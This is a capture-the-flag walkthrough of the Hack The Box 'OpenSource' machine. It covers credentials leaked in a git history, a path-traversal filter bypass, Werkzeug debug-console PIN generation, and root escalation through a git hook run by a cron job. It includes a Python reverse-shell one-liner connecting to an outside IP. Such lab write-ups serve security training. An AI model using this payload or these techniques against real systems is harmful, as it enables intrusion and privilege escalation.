# Opensource

## Introduction:

 - Level; Easy
 - OS: Linux
 - Link: https://app.hackthebox.com/machines/OpenSource

## Steps:
 - I ran nmap in the server and found that it has the following ports:
     - 22 ssh opened
     - 80 http opened
     - 30000 ppp filtered
 - I downloaded the source code from the provided zip file.
 - After reading the source code I found that the folder contains `.git`, so I activated it.
 - Checking old commits, I found that an old file `.vscode/settings.json` which contains: 

```json
{
  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
  "http.proxyStrictSSL": false
}
```

So we got `dev01` as a user and `Soulless_Developer#2022` as a password.

 - Going back to the website, and after reading the code, I was able to read files from the server `path traversal` after escaping `../`:
     - First, I was using `..\/`, but I wasn't able to read some files.
     - After searching for another bypass for the filter, I found `..//` which solved the problem.
 - After causing an error in the website, I found that it's using `Werkzeug` so the thing I have to do is get a console pin:
    - After reading about how to calculate the PIN, I tried using an script from hacktricks: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug
    but the generated pin wasn't correct.
    - I started the docker container in my local machine and tried getting each parameter used when generating the PIN.
     - I got all the parameters, but it still wasn't correct.
     - After reading `Werkzeug` source code and googling, I found out that the hacktricks script is old and the PIN generating logic has changed in recent versions.
     - After getting the right parameters from the box server, here is the script I used : [generate-pin.py](generate-pin.py)
 - After generating the pin and spawning a console, I opened a reverse shell so I can get into the machine:

 ```py
 import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.49",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh");
 ```

 - I tried accessing the port 3000 using `127.0.0.1:3000` but it wasn't working.
 - I tried the same port with the machine address from the docker interface: `172.17.0.1:3000` using `wget` and I got a html response.
 - I searched for a way to forward the traffic from the server to my local machine so I could access the website, and I found `chisel`.
 - I opened a reverse connection between my machine and the server and I was able to access the hidden website, and it was `Gitea` server.
 - I logged in using the credentials I found before in the settings file and I then I found a repository named `home-backup` and it contains ssh keys, so I used the private key to login to ssh.
 - From there I was able to read user.txt file which contain the user flag.
 - Using scp, I tried copying linpeas to the server and running it, but nothing that interesting was found.
 - I searched for another tool and I found `pspy`, so I uploaded it to the server and read its result and I found out that the server was running a cron job as a root each 1 minute, and the repository was the one in `home/dev01`, so I searched about how to exploit this thing and I found out about `git hooks`.
 - From there, I added a hook which is executed before making a commit, which copies the files of /root to a directory in `/home/dev01` and make it accessible.
 - Finally, I waited for a minute and got root.txt file, which contains the root flag.

## Things I learned:
 - Don't be a script kiddy, try to understand what the script/payload is doing and try to understand the source code of libraries you are exploiting.
 - check everything and try different ways when searching for a solution to a problem.